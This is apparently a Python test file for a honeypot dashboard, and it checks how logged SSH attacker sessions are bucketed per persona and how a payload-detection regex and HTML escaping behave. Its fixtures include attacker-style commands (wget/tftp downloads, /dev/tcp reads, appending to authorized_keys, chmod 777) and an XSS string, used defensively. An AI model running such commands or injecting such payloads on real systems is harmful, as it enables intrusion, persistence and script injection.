# The Personas page: how sessions are sorted by how far they got, and what is shown about where they stop.
import time, unittest

from tests.helpers import app

NOW = time.time()


def session(sid, cmds=(), port="2225", ok=True, closed=True, extra=(), ip="198.51.100.50"):
    rows = [(ip, "connect", sid, "ssh", port)]
    if ok:
        rows.append((ip, "login_ok", sid, "root", "pw"))
    rows += [(ip, "cmd", sid, c, None) for c in cmds]
    rows += list(extra)
    if closed:
        rows.append((ip, "closed", sid, "4.0", None))
    return [("p|%s|%d" % (sid, i), NOW - 100 + i, r[0], "cowrie", r[1], r[2], r[3], r[4]) for i, r in enumerate(rows)]


class Stats(unittest.TestCase):
    def setUp(self):
        self.con = app.connect()
        with self.con:
            for t in ("events", "sessions", "ips", "seen"):
                self.con.execute("DELETE FROM %s" % t)
        app._persona_cache.clear()
        self.old = dict(app.PERSONA)
        app.PERSONA.clear()
        app.PERSONA.update({2225: "server", 2323: "camera"})

    def tearDown(self):
        app.PERSONA.clear()
        app.PERSONA.update(self.old)

    def add(self, *sessions):
        rows = []
        for s in sessions:
            rows += s
        app.store(self.con, rows)

    def row(self, name):
        return next(r for r in app.persona_stats(self.con)["rows"] if r["persona"] == name)

    def test_each_session_lands_in_one_bucket(self):
        self.add(session("a", ok=False), session("b"), session("c", ["uname -a"]), session("d", ["id", "ls /"]),
                 session("e", ["id", "wget http://203.0.113.9/x"]), session("f", ["id"], extra=[("198.51.100.50", "file", "f", "/tmp/x", "ab" * 32)]))
        r = self.row("server")
        self.assertEqual((r["sessions"], r["in"], r["none"], r["one"], r["short"], r["payload"]), (6, 5, 1, 1, 1, 2))

    def test_failed_download_counts_as_payload(self):
        self.add(session("a", ["id"], extra=[("198.51.100.50", "file_fail", "a", "http://203.0.113.9/x", None)]))
        self.assertEqual(self.row("server")["payload"], 1)

    def test_looking_for_a_tool_is_no_payload(self):
        self.add(session("a", ["which wget", "curl --version"]))
        r = self.row("server")
        self.assertEqual((r["short"], r["payload"]), (1, 0))

    def test_unfinished_sessions_do_not_count(self):
        self.add(session("a", ["id", "ls"], closed=False))
        self.assertEqual(app.persona_stats(self.con)["rows"], [])

    def test_stop_rate_uses_only_sessions_that_did_more(self):
        self.add(session("a", ["id", "uname -a"]), session("b", ["id", "uname -a"]), session("c", ["uname -a", "id"]), session("d", ["uname -a"]))
        stop = next(s for s in app.persona_stats(self.con)["stops"] if s["shape"] == "uname -a")
        self.assertEqual((stop["n"], stop["ran"]), (2, 3))              # "d" is a one-command probe, not in the denominator

    def test_single_stop_is_left_out(self):
        self.add(session("a", ["id", "uname -a"]))
        self.assertEqual(app.persona_stats(self.con)["stops"], [])

    def test_probe_list(self):
        self.add(session("a", ["echo 12345"]), session("b", ["echo 678"]))
        self.assertEqual(app.persona_stats(self.con)["probes"][0][1][0], 2)

    def test_personas_are_kept_apart(self):
        self.add(session("a", ["id"], port="2323"), session("b", ["id"]))
        self.assertEqual(self.row("camera")["one"], 1)

    def test_unknown_port_gets_a_plain_name(self):
        self.add(session("a", port="9999"))
        self.assertIn("ssh:9999", [r["persona"] for r in app.persona_stats(self.con)["rows"]])

    def test_cached_until_the_data_changes(self):
        first = app.persona_stats(self.con)
        self.assertIs(app.persona_stats(self.con), first)
        self.add(session("a"))                       # an import does not move last_ingest
        self.assertEqual(len(app.persona_stats(self.con)["rows"]), 1)

    def test_payload_guess(self):
        for cmd in ("wget http://203.0.113.9/x", "wget example.org/payload", "tftp example.org -c get payload", "curl -s -O https://example.org/a",
                    "echo key >> ~/.ssh/authorized_keys", "chmod +x /tmp/a ", "chmod 777 /tmp/a ", "cat /dev/tcp/203.0.113.9/80"):
            self.assertTrue(app.PAYLOAD_RE.search(cmd), cmd)
        for cmd in ("which wget", "curl --version", "which wget; echo http://example.org", "cat ~/.ssh/authorized_keys", "chmod 644 /tmp/config ", "wget --help"):
            self.assertFalse(app.PAYLOAD_RE.search(cmd), cmd)

    def test_page_escapes_log_data(self):
        app._local.h12 = False
        bad = "<img src=x onerror=alert(1)>"
        self.add(session("a", ["id", bad]), session("b", ["id", bad]), session("c", [bad]))
        html = app.v_personas()
        self.assertNotIn("<img src=x", html)
        self.assertNotRegex(html, r"\sstyle=")
        self.assertIn("Stopped short", html)

    def test_page_when_empty(self):
        app._local.h12 = False
        self.assertIn("Nothing yet", app.v_personas())
